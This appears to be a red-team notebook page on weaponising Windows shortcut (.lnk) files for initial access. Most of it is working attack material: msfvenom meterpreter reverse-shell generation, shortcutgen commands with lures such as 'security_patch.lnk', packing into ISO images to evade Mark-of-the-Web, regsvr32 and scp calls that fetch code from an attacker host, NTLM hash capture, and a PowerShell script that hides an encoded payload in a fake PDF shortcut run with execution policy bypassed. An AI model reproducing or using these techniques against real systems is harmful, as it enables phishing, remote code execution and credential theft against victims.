# Offensive Tools

## 01 - [[ShortcutGen|ShortcutGen]]

### 1.1 - Reverse Shell

> [!INFO]
> After selecting the custom icon ensure to append the suffix with `,0`. This will make PowerShell to treat it as a string instead of a file.

```
$ mkdir /tmp/payloads/

$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o /tmp/payloads/payload.exe

$ shortcutgen -p lnk -c "C:\Windows\System32\cmd.exe" -a "/c start /min %CD%\payload.exe" --icon "C:\Windows\System32\msi.dll,0" -o /tmp/payloads/security_patch.lnk
```

> [!IMPORTANT] Follow The Exact Steps!
> Pack it into an archive inside a disk image using [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/File Attachment/Document File/Windows/Disk Image/Generate Disk Image/Offensive Tools/PackMyPayload/Usage|`packmypayload`]]. It's recommended when evading MOTW in order for the victim to click on the shortcut file.

```
$ packmypayload -H payload.exe --out-format zip /tmp/payloads/ archive.zip

$ packmypayload --out-format iso /tmp/payloads/ Patches.iso

$ rm archive.zip
```

### 1.2 - SSH File Transfer via Office Macro

```
$ shortcutgen -p lnk -c "C:\Windows\System32\OpenSSH\ssh.exe" -a "-o \"PermitLocalCommand=yes\" -o \"LocalCommand=scp <username>@<attacker_IP>:macro_document.doc %AppData%\Microsoft\Templates\macro_document.doc\. && %AppData%\Microsoft\Templates\macro_document.doc\" <username>@<attacker_IP>" payload.lnk
```

### 1.3 - Capture NTLM Relay

```
$ shortcutgen -p lnk -i "FILESERVER" -s "Documents" -n "document.docx" -d "A hosting server." -o fileserver.lnk
```

Scriptlet file

```
$ shortcutgen -p lnk -c "C:\Windows\System32\regsvr32.exe" -a "/s /u /i://<attacker_IP>/@snare scrobj.dll" --icon "C:\Windows\System32\msi.dll,0" -o payload.lnk
```

SSH Key.

```
$ shortcutgen -p lnk -c "C:\Windows\System32\OpenSSH\ssh.exe" -a "-i \\<attacker_IP>\key.pem root@<IP>" --icon "C:\Windows\System32\msi.dll,0" -o payload.lnk
```

## 02 - PowerShell

TODO: Re-organize it somewhere

```powershell
$ErrorActionPreference = "Stop" # Halt on any error

# Define the shortcut's name and output path
$shortcutFileName = "interesting-title-to-click-on.pdf.lnk"
$shortcutOutputPath = "$Home\Desktop\$shortcutFileName"
$shortcutFallbackExecutionFolder = "$env:temp"

# Define the payload script
$payloadScript = @'
    echo "This payload/script block can be substantial, potentially several megabytes.";
    echo $env:COMPUTERNAME >> $Home\Desktop\IhaveRun.txt
'@

# Encode the payload script in Base64
$payloadBytes = [System.Text.Encoding]::Unicode.GetBytes($payloadScript)
$encodedPayload = [Convert]::ToBase64String($payloadBytes)

# Function to convert byte array to hex string
function Convert-ByteArrayToHexString($byteArray) {
    $hexString = [System.BitConverter]::ToString($byteArray) -replace "-", ""
    return $hexString
}

# Function to convert hex string to byte array
function Convert-HexStringToByteArray($hexString) {
    $hexString = $hexString.ToLower()
    return ,@($hexString -split '([a-f0-9]{2})' | ForEach-Object { if ($_) { [System.Convert]::ToByte($_, 16) } })
}

# Function to create the shortcut with embedded payload
function CreateShortcut($payloadStartPosition, $payloadLength) {
    try {
        # Carving script to extract and execute the payload
        $carvingScript = @'
$startPosition, $payloadSize = $payloadStartPosition, $payloadLength;
$shortcutFile = '$shortcutFileName';
if (-not (Test-Path \$shortcutFile)) {
    $shortcut = Get-ChildItem -Path $shortcutFallbackExecutionFolder -Filter $shortcutFile -Recurse;
    [IO.Directory]::SetCurrentDirectory($shortcut.DirectoryName);
}
$lnkStream = New-Object IO.FileStream $shortcutFile, 'Open', 'Read', 'ReadWrite';
$encodedPayloadBytes = New-Object byte[]($payloadSize);
$lnkStream.Seek(\$startPosition, [IO.SeekOrigin]::Begin);
$lnkStream.Read($encodedPayloadBytes, 0, $payloadSize);
$decodedPayload = [Convert]::FromBase64CharArray($encodedPayloadBytes, 0, $encodedPayloadBytes.Length);
$payloadScript = [Text.Encoding]::Unicode.GetString($decodedPayload);
iex $payloadScript;
'@

        # Compress and encode the carving script
        $compressedCarvingScript = $carvingScript -replace "`n", '' -replace "`r", ''
        $carvingScriptBytes = [System.Text.Encoding]::ASCII.GetBytes($compressedCarvingScript)
        $encodedCarvingScript = [Convert]::ToBase64String($carvingScriptBytes)

        # Create the shortcut
        $wshShell = New-Object -ComObject WScript.Shell
        $shortcut = $wshShell.CreateShortcut($shortcutOutputPath)
        $shortcut.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
        $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand $encodedCarvingScript"
        $shortcut.IconLocation = "C:\Windows\System32\SHELL32.dll, 1"
        $shortcut.Save()
        Write-Host "Shortcut created successfully." -ForegroundColor "Green"
    } catch {
        Write-Host "Error creating shortcut: $_" -ForegroundColor "Red"
    }
}

try {
    # Step 1: Create a dummy shortcut to determine payload start position
    Write-Host "Creating temporary shortcut for payload position calculation." -ForegroundColor "Green"
    $payloadLength = $encodedPayload.Length
    CreateShortcut 9999 $payloadLength

    # Step 2: Locate the start position of the payload in the shortcut file
    $encoding = [System.Text.Encoding]::UTF8
    $computerName = $env:COMPUTERNAME
    $computerNameBytes = $encoding.GetBytes($computerName.ToLower())
    $shortcutBytes = [System.IO.File]::ReadAllBytes($shortcutOutputPath)
    $shortcutHexContent = (Convert-ByteArrayToHexString $shortcutBytes) -join ''
    $computerNameHex = (Convert-ByteArrayToHexString $computerNameBytes) -join ''

    $payloadStartPosition = ($shortcutHexContent.IndexOf($computerNameHex)) / 2
    Write-Host "Payload start position in shortcut file: $payloadStartPosition" -ForegroundColor "Green"

    # Step 3: Remove the dummy shortcut and create the final one
    Remove-Item $shortcutOutputPath -ErrorAction Stop
    CreateShortcut $payloadStartPosition $payloadLength

    # Step 4: Embed the actual payload into the shortcut file
    $encodedPayloadBytes = $encoding.GetBytes($encodedPayload)
    $encodedPayloadHex = Convert-ByteArrayToHexString $encodedPayloadBytes
    $shortcutBytes = [System.IO.File]::ReadAllBytes($shortcutOutputPath)
    $shortcutHexContent = (Convert-ByteArrayToHexString $shortcutBytes) -join ''
    $updatedShortcutHexContent = $shortcutHexContent -replace $computerNameHex, $encodedPayloadHex
    $updatedShortcutBytes = Convert-HexStringToByteArray $updatedShortcutHexContent

    Set-Content -Value $updatedShortcutBytes -Encoding Byte -Path $shortcutOutputPath
    Write-Host "Payload successfully embedded into the shortcut file." -ForegroundColor "Green"
} catch {
    Write-Host "An error occurred: $_" -ForegroundColor "Red"
}
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/File Attachment/Shortcut File/Windows/Manual|Manual: Windows Shortcut File]]

### Source Repositories

- [strayge: pylnk](https://github.com/strayge/pylnk)

- [rvrsh3ll: `Create-HotKeyLNK.ps1`](https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Create-HotKeyLNK.ps1)

### Bordergate

- [Bordergate: Disguising Client Side Payloads](https://www.bordergate.co.uk/disguising-client-side-payloads/)

### Pentestlab

- [Pentestlab Blog: Persistence Shortcut Modification](https://pentestlab.blog/2019/10/08/persistence-shortcut-modification/)

### Hacking Articles

- [Hacking Articles: Windows Persistence Shortcut Modification](https://www.hackingarticles.in/windows-persistence-shortcut-modification-t1547/)

### DMCXBLUE

- [DMCXBLUE: Capturing Hashes](https://dmcxblue.net/2020/06/17/capturing-hashes/)

### Osanda

- [Osanda: Places of Interest in Stealing NetNTLM Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/)

### Assume Breach

- [Assume Breach: Using LNK Files To Bypass Applocker](https://assume-breach.medium.com/home-grown-red-team-using-lnk-files-to-bypass-applocker-3fb1ecae291f)

- [Assume Breach: LNK Phishing Revisited In 2023](https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-revisited-in-2023-364daf70a06a)

- [Assume Breach: LNK Phishing In 2023 Revisited…Again](https://assume-breach.medium.com/home-grown-red-team-lnk-phishing-in-2023-revisited-again-2b8c885b9836)

### RedSiege

- [RedSiege: SSHishing – Abusing Shortcut Files and the Windows SSH Client for Initial Access](https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/)

### B4ckdoor

- [b4ckdoor: Is Macro Phishing Dead in 2024? — A Scheduled Task for Initial Access and Persistence using macro by Abusing Shortcut Files and SSH](https://b4ckdoor.medium.com/is-macro-phishing-dead-in-2024-56b7b4473a29)

### BadOption

- [BadOption: ZipLink - Combine Zips and Lnk for fun and profit](https://badoption.eu/blog/2023/09/28/ZipLink.html)

### Uperesia

- [Uperesia: Booby Trap a Shortcut with a Backdoor](https://www.uperesia.com/booby-trapped-shortcut)